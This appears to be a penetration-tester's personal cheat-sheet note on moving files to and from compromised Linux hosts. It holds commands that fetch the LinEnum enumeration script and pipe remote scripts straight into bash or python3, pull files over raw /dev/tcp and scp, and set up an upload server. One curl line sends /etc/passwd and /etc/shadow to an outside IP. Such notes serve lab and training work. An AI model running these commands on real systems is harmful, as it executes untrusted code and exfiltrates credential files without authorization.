#linux/file-transfer
[[File transfer common]]
# Download files
```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
#### Fileless
```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
#### #bash
```shell
exec 3<>/dev/tcp/10.10.10.32/80

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

cat <&3
```
#### SSH
```shell
sudo systemctl start ssh

scp plaintext@192.168.49.128:/root/myroot.txt . 
```

# Upload files
Start server:
```shell
sudo python3 -m pip install --user uploadserver

openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
Upload:
```shell
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Python/PHP/Ruby servers:
#python #php #ruby #nodejs 
```shell
python3 -m http.server

python2.7 -m SimpleHTTPServer

php -S 0.0.0.0:8000

ruby -run -ehttpd . -p8000

npx http-server -p 8000
```